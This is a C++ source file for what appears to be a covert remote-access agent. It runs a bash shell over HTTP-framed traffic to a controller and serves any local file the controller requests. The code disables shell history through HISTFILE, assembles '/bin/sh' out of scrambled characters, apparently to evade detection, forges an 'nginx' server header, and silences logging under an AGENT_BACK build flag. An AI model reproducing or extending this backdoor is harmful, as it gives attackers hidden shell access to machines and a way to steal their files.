
#include <unistd.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <utmp.h>
#include <fcntl.h>
#include <string.h>
#include <vector>
#include <algorithm>
#include <sys/select.h>
#include <sys/stat.h>
#include <unistd.h>

#include "SShd.h"
#include "net/HttpResponse.h"
#include "../../setting.h"

SShd*        SShd::sshd_               = nullptr;
FileManager* FileManager::fileManager_ = nullptr;

void SShd::init() {
    tty_ = 0;
    pty_ - 0;
    cmd_          = "/bin/bash";
    filter_       = true;
    login_filter_ = true;

    getfile_ = std::bind(&SShd::getFile, this, std::placeholders::_1,
                         std::placeholders::_2);

    putfile_ = std::bind(&SShd::putFile, this, std::placeholders::_1,
                         std::placeholders::_2);

    struct winsize ws;
    char *         slave, *temp, *shell;
    int            ret, len, pid, n, saveErrno;

    if (openpty(&pty_, &tty_, NULL, NULL, NULL) < 0) {
        perror("openpty error:");
        return;
    }
    slave = ttyname(tty_);
    if (slave == NULL) {
        return;
    }

    _setNonBlock(pty_);

    string temp1 = "HISTFILE=";
    putenv(const_cast<char*>(temp1.c_str()));

    _events_CC_readable(httpHandler_);

    string term = "TERM=" + httpHandler_->getHeader("Term");
    putenv(const_cast<char*>(term.c_str()));
    if (ioctl(pty_, TIOCSWINSZ, &ws) < 0) {
        perror("ioctl error");
        return;
    }

    std::vector<char> winSize = httpHandler_->getBodyByArry();
    ws.ws_row                 = ((int)winSize[0] << 8) + (int)winSize[1];
    ws.ws_col                 = ((int)winSize[2] << 8) + (int)winSize[3];
    ws.ws_xpixel              = 0;
    ws.ws_ypixel              = 0;

    pid = fork();

    if (pid < 0) {
        return;
    }

    if (pid == 0) {
        close(httpHandler_->getFd());
        close(pty_);

        if (setsid() < 0) {
            return;
        }
        /* set controlling tty, to have job control */
        if (ioctl(tty_, TIOCSCTTY, NULL) < 0) {
            perror("ioctl faild");
            return;
        }

        /* tty becomes stdin, stdout, stderr */
        dup2(tty_, 0);
        dup2(tty_, 1);
        dup2(tty_, 2);

        if (tty_ > 2) {
            close(tty_);
        }

        shell = (char*)malloc(8);

        if (shell == NULL) {
            return;
        }

        shell[0] = '/';
        shell[4] = '/';
        shell[1] = 'b';
        shell[5] = 's';
        shell[2] = 'i';
        shell[6] = 'h';
        shell[3] = 'n';
        shell[7] = '\0';

        execl(shell, shell + 5, "-c", cmd_.c_str(), (char*)0);

        /* d0h, this shouldn't happen */
        return;
    }

    // 父进程(main)即将陷入shell loop
    else {
#ifndef AGENT_BACK
        std::cout << "sshd::init(): 父进程陷入shell-loop(master-pty" << pty_
                  << "), "
                  << "子进程进入bash(slave-tty\n"
                  << tty_ << ")\n";
        close(tty_);
#endif
        return;
    }
}

void SShd::reset() {
    // filter无需设置

    if (cmd_ == "shell_stop\r")
        ::write(pty_, "\r", 1);
}

/**
 * @bug 返回值尚未定义清楚
 */
int SShd::runshell() {
    // for access loop again
    reset();

    fd_set rd;
    int    n, ret;

    while (1) {
        httpHandler_->resetParse();

        FD_ZERO(&rd);
        FD_SET(fd_, &rd);
        FD_SET(ffd_, &rd);
        FD_SET(pty_, &rd);

        n = (ffd_ > fd_) ? ffd_ : fd_;
        n = (n > pty_) ? n : pty_;

        if (select(n + 1, &rd, NULL, NULL, NULL) < 0) {
            return -1;
        }

        if (FD_ISSET(fd_, &rd)) {
            ret = this->_events_pty_writable();
            if (ret != SUCCESS) {
                return ret;
            }
        }

        if (FD_ISSET(pty_, &rd)) {
            ret = this->_events_pty_readable();
            if (ret != SUCCESS) {
                return ret;
            }
        }

        if (FD_ISSET(ffd_, &rd)) {
            ret = this->_events_file();
            if (ret != SUCCESS) {
                return ret;
            }
        }
    }
}

int SShd::_events_pty_readable() {
    int ret   = -1;
    int Errno = 0;

    // login不过滤 && 每个命令(包含二次进入)仅且仅过滤一次
    if (!login_filter_ && filter_) {
        char buf[cmd_.size() + 1];
        ret     = ::read(pty_, buf, cmd_.size() + 1);
        filter_ = false;
    }

    // 读取tty响应的数据
    while (1) {
        ret = _outBuff.readFd(pty_, &Errno);
        if (ret == 0) {
            return ERROR;
        }
        if (ret < 0 && Errno != EAGAIN) {
#ifndef AGENT_BACK
            perror("SShd::_events_pty_readable()ret==-1:");
#endif
            return ERROR;
        }

        if (ret < 0 && Errno == EAGAIN) {
            break;
        }
    }

    // 打包发送
    if (_outBuff.readableBytes() > 0) {
#ifndef AGENT_BACK
        std::cout << "SSH-Server发送数据包(body) 长度"
                  << _outBuff.readableBytes() << std::endl;
#endif
        HttpResponse response(false);
        response.setStatusCode(200);
        response.addHeader("Action", "3");
        response.addHeader("Server", "nginx");
        response.setBody(_outBuff.peek(), _outBuff.readableBytes());
        response.createResponse(&(httpHandler_->outBuff_));
        _outBuff.retrieveAll();
        httpHandler_->write(&Errno);

        return SUCCESS;
    }

    // 本次并没有什么数据，等待下次通知
    else {
        return SUCCESS;
    }
}

int SShd::_events_file() {
    HttpRequest* httphandler = new HttpRequest(ffd_);
    switch (_events_CC_readable(httphandler)) {
        case SUCCESS:
            break;

        case ERROR:
            delete httphandler;
            return ERROR;

        case CLOSE:
            delete httphandler;
            return CLOSE;
    }
    string path = httphandler->getQuery();
    FileManager::getInstance()->File_pushJob(
        std::bind(getfile_, httphandler, path));
    
    return SUCCESS;
}

int SShd::_events_pty_writable() {
    filter_       = true;
    login_filter_ = false;
    int readError, nRead;

    switch (_events_CC_readable(httpHandler_)) {
        case SUCCESS:
            break;

        case ERROR:
            return ERROR;

        case CLOSE:
            return CLOSE;
    }

    cmd_  = httpHandler_->getBodyByString();
    int n = ::write(pty_, cmd_.data(), cmd_.size());

    return SUCCESS;
}

int SShd::_events_CC_readable(HttpRequest* httphandler) {
    httphandler->resetParse();

    int readError, nRead;

    while (!httphandler->parseFinish()) {
        nRead = httphandler->read(&readError);

        if (nRead == 0) {
            return CLOSE;
        }
        if (nRead < 0) {
            return ERROR;
        }

        if (httphandler->parseRequest() != HttpRequest::GotAll)
            continue;
    }

    return SUCCESS;
}

int SShd::_setNonBlock(int fd) {
    int flag = ::fcntl(fd, F_GETFL, 0);
    if (flag == -1) {
        // printf("utils::setNonBlock[%d],listenFd:%s\n", fd,
        // strerror(errno));
        return -1;
    }
    flag |= O_NONBLOCK;
    if (::fcntl(fd, F_SETFL, flag) == -1) {
        // printf("utils::setNonBlock[%d],listenFd:%s\n", fd,
        // strerror(errno));
        return -1;
    }
    return 0;
}

int SShd::getFile(HttpRequest* httpHandler, string path) {
    int         ret, Errno;
    struct stat buffer;
    int         fd;
    long long   size;
    long long   sum = 0;

    // pre tarsf
    if (access(path.c_str(), 0) != F_OK ||
        stat(path.c_str(), &buffer) != 0 || (!S_ISREG(buffer.st_mode))) {
        // std::cout << "\n[invalid local path]: Please check and try
        // again\n";
        HttpResponse response(404);
        response.createResponse(&(httpHandler->outBuff_));
        ret = httpHandler->write(&Errno);
        return SUCCESS;
    }
    size = buffer.st_size;

    fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) {
        HttpResponse response(404);
        response.createResponse(&(httpHandler->outBuff_));
        ret = httpHandler->write(&Errno);
        return SUCCESS;
    }

    while (1) {
        Buffer _outBuff;
        ret = _outBuff.readFd(fd, &Errno);

        if (ret > 0) {
            HttpResponse response(200);
            response.addHeader("Ftp-Size", std::to_string(size));
            response.setBody(_outBuff.peek(), _outBuff.readableBytes());
            response.createResponse(&(httpHandler->outBuff_));
            int tem = _outBuff.readableBytes();
            _outBuff.retrieveAll();
            ret = httpHandler->write(&Errno);
            sum += tem;

#ifndef AGENT_BACK
            std::cout << "[FTP_Server] 请求文件大小:" << size
                      << "   目前总计发了:" << sum
                      << " 本次实际发送了(算http头):" << ret << std::endl;
#endif
            if (ret <= 0) {
#ifndef AGENT_BACK
                std::cout << "Ftpd::getFile():httpHandler->write Error"
                          << Errno << "\n";
#endif
                return CLOSE;
            }
        }
        if (ret <= 0) {
            close(fd);
            break;
        }
    }

    delete (httpHandler);
    return SUCCESS;
}

int SShd::putFile(HttpRequest* httpHandler, string path) {
    return SUCCESS;
}

FileManager::FileManager(int num, std::vector<std::thread>* const threads) {
    for (int i = 0; i < num; i++) {
        (*threads).emplace_back([this] {
            prctl(PR_SET_NAME, "FileManager");

            while (1) {
                File_JobFunction             func;
                std::unique_lock<std::mutex> lock(File_lock_);

                while (Job_queues_.empty() && !stop_) {
                    File_conn_.wait(lock);
                }

                if (Job_queues_.empty() && stop_) {
                    return;
                }

                func = Job_queues_.front();
                Job_queues_.pop();

                if (func) {
                    func();
                }
            }
        });
    }
}

// FileManager::~FileManager() {
//     {
//         std::unique_lock<std::mutex> lock(File_lock_);
//         stop_ = true;
//     }
//     File_conn_.notify_all();  //
//     唤醒等待该条件的所有线程，若没有什么也不做 for (auto& thread :
//     threads_) {
//         thread.join();  // 让主控线程等待（阻塞）子线程退出
//     }
//     printf("[FileManager::~FileManager] FileManager is remove\n");
// }

void FileManager::File_pushJob(const File_JobFunction& job) {
    {
        std::unique_lock<std::mutex> lock(File_lock_);
        Job_queues_.push(job);
    }
    File_conn_.notify_one();
}
